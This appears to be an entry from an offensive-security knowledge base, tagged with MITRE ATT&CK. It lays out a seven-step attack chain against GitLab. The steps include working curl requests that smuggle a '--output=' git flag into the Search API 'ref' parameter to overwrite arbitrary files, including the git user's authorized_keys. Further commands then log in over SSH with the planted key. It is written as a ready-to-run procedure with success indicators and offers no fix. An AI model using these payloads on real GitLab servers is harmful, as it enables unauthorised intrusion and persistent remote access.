---
tags:
  - gitlab
  - command-injection
  - file-overwrite
  - rce
  - ssh-key-injection
type: attack_chain
tools:
  - '[[tools/ssh]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
commands: []
platforms:
  - Linux
  - Web
complexity: medium
procedures:
  - '[[procedures/Create-Wiki-Page-with-Controlled-Content]]'
  - '[[procedures/Inject-Git-Flag-via-Search-API-to-Overwrite-File]]'
  - '[[procedures/Verify-File-Overwrite]]'
  - '[[procedures/Generate-SSH-Key-Pair]]'
  - '[[procedures/Create-Wiki-Page-with-SSH-Public-Key]]'
  - '[[procedures/Inject-Git-Flag-to-Overwrite-Authorized-Keys]]'
  - '[[procedures/Establish-SSH-Access-and-Verify]]'
step_count: 7
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
description: >-
  Exploitation of a command injection vulnerability in GitLab's Search API to
  overwrite arbitrary files and achieve remote code execution via SSH key
  injection
skill_level: intermediate
impact_level: high
id: 14f7fab1-0e20-43f5-b3a5-b032e1ee2601
created_at: '2025-12-11T03:47:47.607Z'
updated_at: '2025-12-11T03:47:47.607Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
  - '[[TA0004]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1059.004]]'
---
# GitLab Git Flag Injection Leading to File Overwrite and Remote Code Execution

Multi-stage attack chain demonstrating exploitation of a Git flag injection vulnerability in GitLab's Search API, allowing arbitrary file overwrites and leading to remote code execution as the git user via SSH key injection.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 7 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Wiki Page] --> B[Inject Flag to Overwrite File]
    B --> C[Verify Overwrite]
    C --> D[Generate SSH Key]
    D --> E[Create Wiki with Key]
    E --> F[Inject to Authorized Keys]
    F --> G[SSH Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#e74c3c
    style F fill:#f39c12
    style G fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- #curl
- #cat
- [[tools/ssh]]

### Target Environment

- GitLab server on Linux
- Required services: GitLab API, SSH
- Network access: HTTP access to GitLab API, SSH port open

### Initial Access Requirements

- Valid GitLab API token ($TOKEN)
- Access to create wiki pages in a project
- Network access to the GitLab instance

## Detailed Attack Procedures

### Step 1: Create Wiki Page with Controlled Content - [[procedures/Create-Wiki-Page-with-Controlled-Content]]

**Procedure**: [[procedures/Create-Wiki-Page-with-Controlled-Content]]

**Objective**: Create a wiki page to control the content that will be written during the file overwrite.

**Expected Output**: A new wiki page with the specified commit message.

**Success Indicators**:
- Wiki page created successfully
- Commit message set to controlled content

### Step 2: Inject Git Flag via Search API to Overwrite File - [[procedures/Inject-Git-Flag-via-Search-API-to-Overwrite-File]]

**Procedure**: [[procedures/Inject-Git-Flag-via-Search-API-to-Overwrite-File]]

**Objective**: Exploit the flag injection to overwrite an arbitrary file with the commit content.

**Instructions**:
Use [[commands/curl-gitlab-search-api]] to make the API call:

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```

**Expected Output**: Git command executes and writes to /tmp/file.

**Success Indicators**:
- API call succeeds without errors
- File is created or overwritten

### Step 3: Verify File Overwrite - [[procedures/Verify-File-Overwrite]]

**Procedure**: [[procedures/Verify-File-Overwrite]]

**Objective**: Confirm that the file has been overwritten with the controlled content.

**Instructions**:
Use [[commands/cat-file-contents]] to check the file:

```bash
cat /tmp/file
```

**Expected Output**: Displays the commit details including 'controlled content'.

**Success Indicators**:
- File contents match the expected commit message

### Step 4: Generate SSH Key Pair - [[procedures/Generate-SSH-Key-Pair]]

**Procedure**: [[procedures/Generate-SSH-Key-Pair]]

**Objective**: Create an RSA key pair for SSH authentication.

**Expected Output**: New SSH key pair generated.

**Success Indicators**:
- Key files created successfully

### Step 5: Create Wiki Page with SSH Public Key - [[procedures/Create-Wiki-Page-with-SSH-Public-Key]]

**Procedure**: [[procedures/Create-Wiki-Page-with-SSH-Public-Key]]

**Objective**: Create a wiki page with the SSH public key as the commit message.

**Expected Output**: Wiki page with public key in commit.

**Success Indicators**:
- Commit message set to public key content

### Step 6: Inject Git Flag to Overwrite Authorized Keys - [[procedures/Inject-Git-Flag-to-Overwrite-Authorized-Keys]]

**Procedure**: [[procedures/Inject-Git-Flag-to-Overwrite-Authorized-Keys]]

**Objective**: Overwrite the authorized_keys file with the public key.

**Instructions**:
Use [[commands/curl-gitlab-search-api]] with ref for authorized_keys:

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/var/opt/gitlab/.ssh/authorized_keys'
```

**Expected Output**: authorized_keys overwritten.

**Success Indicators**:
- API call succeeds
- Key injected into file

### Step 7: Establish SSH Access and Verify - [[procedures/Establish-SSH-Access-and-Verify]]

**Procedure**: [[procedures/Establish-SSH-Access-and-Verify]]

**Objective**: SSH into the server and verify access as git user.

**Instructions**:
Use [[commands/ssh-connect-with-key]] to connect:

```bash
ssh git@gitlab-vm.local -i gitlab
```
Then run [[commands/id-verify-user]]:

```bash
id
```
And [[commands/cat-authorized-keys]]:

```bash
cat /var/opt/gitlab/.ssh/authorized_keys
```

**Expected Output**: Shell access and user details.

**Success Indicators**:
- Successful SSH connection
- User ID confirms git user
- authorized_keys shows injected key

## Attack Chain Summary

### Key Achievements

1. Arbitrary file overwrite via Git flag injection
2. SSH key injection into authorized_keys
3. Remote code execution as git user

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Unix Shell]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Privilege Escalation]]

*Last updated: 2023-10-01*
